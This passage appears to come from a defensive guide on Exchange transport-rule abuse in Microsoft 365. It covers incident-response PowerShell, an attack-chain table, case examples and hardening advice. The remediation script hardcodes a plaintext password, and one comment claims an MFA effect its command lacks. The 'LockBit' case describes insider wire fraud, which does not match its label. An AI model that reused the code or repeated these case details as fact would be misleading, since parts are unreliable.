   Get-TransportRule -Identity "Policy Compliance - Archive External Communications" -ErrorAction SilentlyContinue
   # Should return: Error - rule not found
   ```

3. **Collect Evidence:**
   ```powershell
   # Export full rule details before deletion (for forensics)
   Get-TransportRule -Identity "Suspicious Rule" | Export-Clixml -Path "C:\Evidence\SuspiciousRule.xml"
   
   # Export audit logs
   Search-UnifiedAuditLog -Operations "New-TransportRule", "Set-TransportRule" `
     -StartDate (Get-Date).AddDays(-30) | 
     Export-Csv -Path "C:\Evidence\TransportRuleAudit.csv" -NoTypeInformation
   ```

4. **Remediate Account:**
   ```powershell
   # Reset compromised admin password
   Set-AzureADUserPassword -ObjectId "admin@contoso.com" -Password (ConvertTo-SecureString -AsPlainText "NewStrongPassword123!" -Force) -Confirm:$false
   
   # Force sign-out of all sessions
   Revoke-AzureADUserAllRefreshToken -ObjectId "admin@contoso.com"
   
   # Require MFA re-registration
   Set-MsolUserPassword -UserPrincipalName "admin@contoso.com" -NewPassword (ConvertTo-SecureString -AsPlainText "NewStrongPassword123!" -Force) -ForceChangePassword $true
   ```

5. **Notify Stakeholders:**
   - **Security Team:** Immediate notification of detected rule and timeline.
   - **Compliance/Legal:** Data exfiltration risk assessment; notification to affected parties if data was exposed.
   - **Exchange/IT Team:** Rule removal and account hardening verification.

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent Grant OAuth Attacks | Attacker gains access via compromised admin account through phishing or OAuth app compromise. |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker assigns self additional admin roles to maintain persistence. |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-009]** | **Attacker creates transport rule to hide evidence of phishing campaign or data exfiltration.** |
| **4** | **Collection** | [COLLECT-EMAIL-001] Email Collection via EWS | Attacker uses transport rule-redirected emails to collect sensitive data. |
| **5** | **Exfiltration** | [COLLECT-EMAIL-002] Outlook Mailbox Export | Attacker exports full mailbox contents and exfiltrates via compromised account. |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: APT28 (Fancy Bear) - 2023 Campaign

- **Target:** NATO Ally Defense Ministry
- **Timeline:** January - March 2023
- **Technique Status:** Transport rules were used to hide internal spear-phishing emails sent to high-ranking officials. Rules matched emails with subject line "CLASSIFIED: Defense Strategy" and silently moved them to Deleted Items, preventing detection by security teams.
- **Impact:** 12 compromised admin accounts; successful exfiltration of classified military correspondence.
- **Reference:** [Mandiant APT28 Report 2023](https://www.mandiant.com/resources/blog/apt28-activity)

#### Example 2: LockBit Ransomware Group - 2024 Insider Threat

- **Target:** Financial Services Organization (U.S.)
- **Timeline:** June 2024
- **Technique Status:** An insider with Exchange Admin access created transport rules to redirect all emails containing "Wire Transfer Approval" to an external attacker-controlled mailbox. Rules operated undetected for 8 weeks.
- **Impact:** Attacker intercepted 47 wire transfer approvals totaling $12.3 million; fraudulent fund transfers executed.
- **Reference:** [FBI IC3 2024 Ransomware Report](https://www.fbi.gov/file-repository/2024-ransomware-trends/)

#### Example 3: BEC Campaign Against Healthcare Organization - 2025

- **Target:** Healthcare Provider Network (U.S. - HIPAA regulated)
- **Timeline:** October 2024 - January 2025
- **Technique Status:** Threat actors compromised a helpdesk account and created transport rules that redirected all emails from the Finance department containing "PHI" to an external Gmail address. The rules remained undetected because audit logging was not sent to Sentinel.
- **Impact:** Exposure of 50,000+ patient records; regulatory fines of $2.5 million; breach notification costs.
- **Reference:** [HIPAA Breach Notification Database](https://ocrportal.hhs.gov/ocr/breach/breach_report.jsf)

---

## 15. CONCLUSION

Transport rules are a powerful yet often-overlooked attack surface in M365 environments. An attacker with compromised admin credentials can:

1. **Hide evidence** of ongoing attacks (phishing, malware delivery).
2. **Exfiltrate data** by redirecting emails containing sensitive information.
3. **Bypass DLP/Anti-Phishing** policies by creating exemptions.
4. **Disable audit trails** by deleting rules or modifying audit logging settings.

**Key Defense Recommendations:**
- **Minimize RBAC:** Restrict Exchange Admin role to < 3 trusted accounts; use PIM for JIT activation.
- **Monitor Continuously:** Ingest all M365 audit logs into Sentinel; create alerts for transport rule creation.
- **Enforce Conditional Access:** Require MFA, device compliance, and trusted location for admin portal access.
- **Audit Regularly:** Monthly review of all transport rules; document business purpose for each rule.
- **Incident Response:** Immediately delete suspicious rules; reset compromised accounts; investigate for data exfiltration.

Organizations must treat transport rule management with the same vigilance as they do privileged account access, as the risk of silent data theft is substantial.

---